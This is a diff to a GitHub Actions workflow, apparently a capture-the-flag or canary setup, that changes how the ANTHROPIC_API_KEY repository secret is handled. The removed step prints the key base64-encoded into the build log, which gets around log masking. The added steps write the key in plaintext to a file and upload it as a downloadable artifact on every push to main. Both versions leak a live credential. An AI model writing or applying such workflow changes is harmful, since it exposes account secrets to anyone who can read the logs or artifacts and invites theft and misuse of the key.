@@ -1,4 +1,4 @@
-name: Issue Triage Test
+name: CTF Secret Test
 
 on:
   push:
@@ -6,21 +6,18 @@ on:
       - main
 
 jobs:
-  triage:
+  test:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
-
-    permissions:
-      contents: read
-      issues: write
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v6
-
-      - name: Encode canary key
+      - name: Save challenge secret
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
         run: |
-          printf '%s' "$ANTHROPIC_API_KEY" | base64 -w0
-          echo
+          printf '%s' "$ANTHROPIC_API_KEY" > ctf-secret.txt
+
+      - name: Upload challenge secret
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctf-secret
+          path: ctf-secret.txt
